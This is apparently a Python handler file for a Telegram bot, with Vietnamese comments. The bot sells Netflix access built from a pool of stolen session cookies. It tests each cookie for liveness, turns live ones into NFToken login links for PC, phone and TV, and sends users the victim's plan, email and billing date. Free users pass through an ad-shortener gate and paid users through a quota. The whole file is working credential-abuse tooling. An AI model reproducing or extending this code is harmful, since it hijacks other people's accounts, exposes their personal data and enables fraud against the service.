"""
Handlers for the minimal Netflix bot.

Only /start and /loginlink. Quota + plan live on Supabase (web-managed).
"""

import asyncio
import logging
import random
import time
from concurrent.futures import ThreadPoolExecutor
from html import escape
from urllib.parse import quote

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

from config import (
    ADMIN_IDS,
    ADMIN_TAG,
    WEB_URL,
    SHRINKME_API_KEY,
)
from lang import t
from supabase_client import (
    consume_quota,
    delete_cookie,
    downgrade_expired,
    get_cookie_pool,
    get_profile_by_telegram,
    get_quota_left,
    get_user_lang,
    set_user_lang,
    update_cookie_status,
)
from shrinkme import shorten

logger = logging.getLogger("NetflixBot")

_executor = ThreadPoolExecutor(max_workers=4)

# ── Rate limit: 5 lần/15 phút/user ──
_rate = {}  # user_id -> [timestamps]


def _rate_limited(key, user_id, limit=5, window=15 * 60):
    now = time.time()
    ts = [t for t in _rate.get((key, user_id), []) if now - t < window]
    if len(ts) >= limit:
        _rate[(key, user_id)] = ts
        return True
    ts.append(now)
    _rate[(key, user_id)] = ts
    return False


def _build_device_links(link):
    """Build 3-device login links from a login URL."""
    if not link:
        return {}
    token = ""
    if "nftoken=" in link:
        token = link.split("nftoken=", 1)[1]
    if not token:
        return {"pc": link, "phone": link, "tv": link}
    return {
        "pc": f"https://netflix.com/?nftoken={token}",
        "phone": f"https://netflix.com/unsupported?nftoken={token}",
        "tv": f"https://netflix.com/tv2?nftoken={token}",
    }


def _find_and_generate_login_link():
    """
    Chọn cookie ngẫu nhiên từ pool (Supabase) → check → gen NFToken → validate.
    Returns (link, error, payload).
    """
    from checker import parse_cookie_line, check_cookie, generate_nftoken, validate_nftoken

    pool = get_cookie_pool()
    if not pool:
        return None, "Không có cookie trong pool. Vui lòng thử lại sau.", None

    max_tries = min(len(pool), 10)
    used = set()
    for _ in range(max_tries):
        idx = random.randrange(len(pool))
        if idx in used:
            continue
        used.add(idx)
        raw = pool[idx]

        netflix_id, secure_id, extras = parse_cookie_line(raw)
        if not netflix_id:
            continue

        info = check_cookie(netflix_id, secure_id)
        status = info.get("status")

        if status == "DEAD":
            delete_cookie(raw)
            continue
        if status == "ERROR":
            time.sleep(1)
            continue
        if str(info.get("membershipStatus", "")).upper() == "FORMER_MEMBER":
            delete_cookie(raw)
            continue

        # Cookie LIVE — build cookie dict + gen nftoken
        cookie_dict = {"NetflixId": netflix_id}
        if secure_id:
            cookie_dict["SecureNetflixId"] = secure_id
        cookie_dict.update(extras)
        cookie_dict.update(info.get("_cookies") or {})

        token, error = generate_nftoken(cookie_dict)
        if not token:
            continue

        login_link = f"https://www.netflix.com/login?nftoken={quote(token, safe='')}"
        payload = {
            "plan": info.get("plan") or "-",
            "email": info.get("email") or "-",
            "billing": info.get("billing") or "-",
        }

        # Validate token (không chặn nếu unknown)
        v = validate_nftoken(token)
        if v is False:
            continue

        # Cập nhật trạng thái cookie lên Supabase
        update_cookie_status(
            raw,
            "green",
            country_code=info.get("country"),
            plan_name=info.get("plan"),
            email=info.get("email"),
        )
        return login_link, None, payload

    return None, "Không tìm thấy cookie LIVE. Vui lòng thử lại sau.", None


def _build_loginlink_message(link, payload, quota_left, quota_limit, lang="vi"):
    """Tin nhắn kết quả nhận link — format chuẩn (Plan/Mail/Hạn + 3 link thiết bị)."""
    account_plan = (payload or {}).get("plan") or "-"
    email = (payload or {}).get("email") or "-"
    billing = (payload or {}).get("billing") or "-"

    links = _build_device_links(link)
    admin_url = "https://t.me/" + ADMIN_TAG.lstrip("@")
    lines = [
        t("link_header", lang),
        "",
        t("link_plan", lang, plan=escape(str(account_plan))),
        t("link_mail", lang, email=escape(str(email))),
        t("link_han", lang, billing=escape(str(billing))),
        "",
        t("link_title", lang),
    ]
    if links:
        lines.append(
            t("link_devices", lang, pc=links["pc"], phone=links["phone"], tv=links["tv"])
        )
    else:
        lines.append(f"<code>{escape(link)}</code>")
    lines.append("")
    lines.append(t("link_expire", lang))

    if quota_limit > 0:
        lines.append(t("link_remaining", lang, left=quota_left, limit=quota_limit))
    else:
        lines.append(t("link_remaining_inf", lang))

    lines.append(t("link_admin", lang, admin=f'<a href="{admin_url}">Admin</a>'))
    return "\n".join(lines)


def _build_free_gate_message(shortened_link, lang="vi"):
    """Tin nhắn gate cho user Free: link rút gọn dạng copyable + nút inline tới shrinkme."""
    admin_url = "https://t.me/" + ADMIN_TAG.lstrip("@")
    lines = [
        t("link_shrinkme_gate", lang),
        "",
        t("link_shrinkme_ad", lang),
        "",
        f"🔗 <code>{escape(shortened_link)}</code>",
        "",
        t("link_shrinkme_note", lang),
        "",
        t("link_admin", lang, admin=f'<a href="{admin_url}">Admin</a>'),
    ]
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(t("link_shrinkme_btn", lang), url=shortened_link)],
    ])
    return "\n".join(lines), keyboard


async def _deliver_login_link(update: Update, context: ContextTypes.DEFAULT_TYPE, profile, lang="vi"):
    """Tạo + gửi link đăng nhập. Trừ quota nếu basic/pro."""
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return False

    searching = await msg.reply_text(t("searching", lang), parse_mode=ParseMode.HTML)

    loop = asyncio.get_event_loop()
    link, error, payload = await loop.run_in_executor(_executor, _find_and_generate_login_link)

    if not link:
        await searching.edit_text(
            f"❌ {error or 'Không thể tạo link. Vui lòng thử lại sau.'}",
            parse_mode=ParseMode.HTML,
        )
        return False

    # Áp dụng shrinkme gate cho free users — FAIL-CLOSED: API lỗi → báo lỗi hệ thống
    # link vượt, KHÔNG fallback link gốc (yêu cầu nghiệp vụ).
    plan = profile.get("plan") or "free"
    if plan == "free":
        # shorten() là I/O blocking → chạy trong executor để không chặn event loop
        loop = asyncio.get_event_loop()
        shortened = await loop.run_in_executor(_executor, shorten, link)
        if not shortened:
            await searching.edit_text(
                t("gate_error", lang),
                parse_mode=ParseMode.HTML,
            )
            return False
        gate_text, gate_keyboard = _build_free_gate_message(shortened, lang)
        await searching.edit_text(
            gate_text,
            parse_mode=ParseMode.HTML,
            reply_markup=gate_keyboard,
            disable_web_page_preview=True,
        )
        return True

    # Trừ quota (chỉ basic/pro)
    quota_left = get_quota_left(profile)
    quota_limit = int(profile.get("quota_limit") or 0)
    if profile.get("plan") not in (None, "free"):
        updated = consume_quota(profile)
        if updated:
            quota_left = get_quota_left(updated)

    await searching.edit_text(
        _build_loginlink_message(link, payload, quota_left, quota_limit, lang),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )
    return True


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return

    # Tìm profile theo telegram_id
    profile = get_profile_by_telegram(user.id)
    if not profile:
        await msg.reply_text(
            t("not_linked", get_user_lang(user.id), web=WEB_URL),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Chọn ngôn ngữ trước (lần đầu /start hoặc chưa có lang)
    lang = get_user_lang(user.id)
    if not profile.get("lang"):
        await msg.reply_text(
            t("lang_prompt", lang),
            reply_markup=_lang_keyboard(),
        )
        return

    await _send_welcome(update, profile, lang)


def _lang_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇻🇳 Tiếng Việt", callback_data="lang_vi"),
         InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
    ])


async def _send_welcome(update: Update, profile, lang="vi", msg=None):
    user = update.effective_user
    if not user:
        return
    if msg is None:
        msg = update.effective_message
    if not msg:
        return
    name = user.first_name or user.username or "User"
    plan = profile.get("plan") or "free"
    plan_label = {"free": "Free", "basic": "Basic", "pro": "Pro"}.get(plan, plan)
    await msg.reply_text(
        t("welcome", lang, name=name, plan=plan_label),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )


async def cmd_lang(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id)
    await msg.reply_text(
        t("lang_prompt", lang),
        reply_markup=_lang_keyboard(),
    )


async def on_lang_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query or not query.data:
        return
    user = query.from_user
    if not user:
        return
    lang = "vi" if query.data == "lang_vi" else "en"
    set_user_lang(user.id, lang)
    await query.answer()
    try:
        await query.message.edit_text(
            t("lang_saved", lang),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass
    profile = get_profile_by_telegram(user.id)
    if profile:
        await _send_welcome(update, profile, lang, msg=query.message)


async def cmd_loginlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return

    lang = get_user_lang(user.id)

    # Rate limit: 5 lần/15 phút
    if _rate_limited("loginlink", user.id):
        await msg.reply_text(
            t("rate_limited", lang),
            parse_mode=ParseMode.HTML,
        )
        return

    # Tìm profile theo telegram_id
    profile = get_profile_by_telegram(user.id)
    if not profile:
        await msg.reply_text(
            t("not_linked", lang, web=WEB_URL),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Downgrade nếu plan hết hạn
    profile = downgrade_expired(profile)

    # Kiểm tra quota
    quota_left = get_quota_left(profile)
    quota_limit = int(profile.get("quota_limit") or 0)
    plan = profile.get("plan") or "free"

    if plan not in (None, "free") and quota_left <= 0:
        await msg.reply_text(
            t("no_uses_left", lang),
            parse_mode=ParseMode.HTML,
        )
        return

    await _deliver_login_link(update, context, profile, lang)
